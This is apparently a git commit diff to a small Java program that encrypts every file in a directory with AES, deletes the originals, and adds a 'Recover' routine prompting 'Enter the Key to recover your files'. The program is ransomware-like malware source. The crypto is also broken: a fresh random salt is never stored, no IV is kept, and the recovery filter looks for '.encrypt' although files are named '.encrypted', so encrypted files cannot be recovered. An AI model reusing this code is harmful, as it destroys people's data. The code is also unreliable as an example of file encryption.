ba099a368cbb5bbd23b88eb4400dfc85c36ce30b
Mohamed Haji <haji.m@web.de>
2022-03-05 12:17:00 +0100

    stand 05.03. 12 Uhr

--- report/src/main/java/AES256.java
+++ report/src/main/java/AES256.java
@@ -1,6 +1,8 @@
 import javax.crypto.BadPaddingException;
 import javax.crypto.Cipher;
 import javax.crypto.NoSuchPaddingException;
+import javax.crypto.SecretKeyFactory;
+import javax.crypto.spec.PBEKeySpec;
 import javax.crypto.spec.SecretKeySpec;
 import java.io.File;
 import java.io.FileInputStream;
@@ -9,23 +11,35 @@ import java.io.IOException;
 import java.security.InvalidKeyException;
 import java.security.Key;
 import java.security.NoSuchAlgorithmException;
+import java.security.SecureRandom;
+import java.security.spec.InvalidKeySpecException;
+import java.security.spec.KeySpec;
 
 public class AES256 {
 
     private static final String ALGORITHM = "AES";
-    private static final String TRANSFORMATION = "AES";
+    private static final String TRANSFORMATION = "AES/CBC/PKCS5Padding";
 
-    public static void encrypt(String key, File inputFile, File outputFile) throws Exception{
+    public static void encrypt(String key, File inputFile, File outputFile) throws CryptoException, NoSuchAlgorithmException, InvalidKeySpecException {
         doCrypto(Cipher.ENCRYPT_MODE, key, inputFile, outputFile);
     }
 
-    public static void decrypt(String key, File inputFile, File outputFile) throws Exception{
+    public static void decrypt(String key, File inputFile, File outputFile) throws CryptoException, NoSuchAlgorithmException, InvalidKeySpecException {
         doCrypto(Cipher.DECRYPT_MODE, key, inputFile, outputFile);
     }
 
-    public static void doCrypto(int cipherMode, String key, File inputFile, File outputFile) throws Exception{
+    public static void doCrypto(int cipherMode, String key, File inputFile, File outputFile) throws CryptoException, NoSuchAlgorithmException, InvalidKeySpecException {
+
+        SecureRandom random = new SecureRandom();
+        byte[] salt = new byte[16];
+        random.nextBytes(salt);
+
+        KeySpec spec = new PBEKeySpec(key.toCharArray(), salt, 65536, 256); // AES-256
+        SecretKeyFactory f = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1");
+        byte[] sKey = f.generateSecret(spec).getEncoded();
+
         try{
-            Key secretKey = new SecretKeySpec(key.getBytes(), ALGORITHM);
+            Key secretKey = new SecretKeySpec(sKey, ALGORITHM);
             Cipher cipher = Cipher.getInstance(TRANSFORMATION);
             cipher.init(cipherMode, secretKey);
 
@@ -43,7 +57,7 @@ public class AES256 {
 
         }catch (Exception e){
             System.out.println(e.getMessage());
-            throw new Exception("Error ... ", e);
+            throw new CryptoException("Error ... ", e);
         }
     }
 
--- report/src/main/java/main.java
+++ report/src/main/java/main.java
@@ -1,4 +1,10 @@
 import java.io.File;
+import java.io.FileFilter;
+import java.io.FilenameFilter;
+import java.security.NoSuchAlgorithmException;
+import java.security.spec.InvalidKeySpecException;
+import java.util.Locale;
+import java.util.Scanner;
 
 public class main {
 
@@ -9,7 +15,7 @@ public class main {
 
     public static void main(String[] args) {
 
-        FireUP(basedir);
+        Decrypt(basedir + "test.txt", CodeKey);
 
     }
 
@@ -20,7 +26,7 @@ public class main {
         for(File f:files){
             System.out.println(f.getName());
             System.out.println();
-            Encrypt(path + f.getName());
+            Encrypt(path + f.getName(), CodeKey);
         }
     }
 
@@ -28,16 +34,72 @@ public class main {
     public static void Encrypt(String targetFilePath, String CodeKey){
 
         File inputFile = new File(targetFilePath);
-        File encryptedFile = new File(targetFilePath + ".mcg");
+        File encryptedFile = new File(targetFilePath + ".encrypted");
 
         try{
             AES256.encrypt(CodeKey, inputFile, encryptedFile);
             System.out.println(inputFile + "is encrypted now...");
             inputFile.delete();
 
-        } catch (Exception e){
+        } catch (CryptoException | NoSuchAlgorithmException | InvalidKeySpecException e){
             System.out.println(e.getMessage());
             e.printStackTrace();
+        }
+
+    }
+
+
+    public static void Decrypt(String targetFilePath, String CodeKey){
+        File inputFile = new File(targetFilePath);
+        File decryptedFile = new File(targetFilePath + ".decrypted");
+
+        try{
+            AES256.decrypt(CodeKey, inputFile, decryptedFile);
+            System.out.println(inputFile + "is decrypted now...");
+
+        } catch (CryptoException e){
+            System.out.println(e.getMessage());
+            e.printStackTrace();
+        } catch (NoSuchAlgorithmException e) {
+            e.printStackTrace();
+        } catch (InvalidKeySpecException e) {
+            e.printStackTrace();
+        }
+    }
+
+
+
+    public static void Recover(String CodeKey, String directoryPath){
+        Scanner myObj = new Scanner(System.in);
+        System.out.println("Enter the Key to recover your files: ");
+
+        String code = myObj.nextLine();
+        System.out.println("Entered Key is: " + code);
+
+
+        if (code.equals(CodeKey)){
+            System.out.println("Okay....");
+            File file = new File(directoryPath);
+            FileFilter filter;
+            File[] files = file.listFiles(new FilenameFilter() {
+                @Override
+                public boolean accept(File dir, String name) {
+                    if(name.toLowerCase().endsWith(".encrypt")){
+                        return true;
+                    }else{
+                        return false;
+                    }
+                }
+            });
+
+            for (File f: files){
+                System.out.println(f.getName());
+                Decrypt(directoryPath + f.getName(), CodeKey);
+            }
+
+
+        }else {
+            System.out.println("Its Wrong ... ");
         }
 
     }
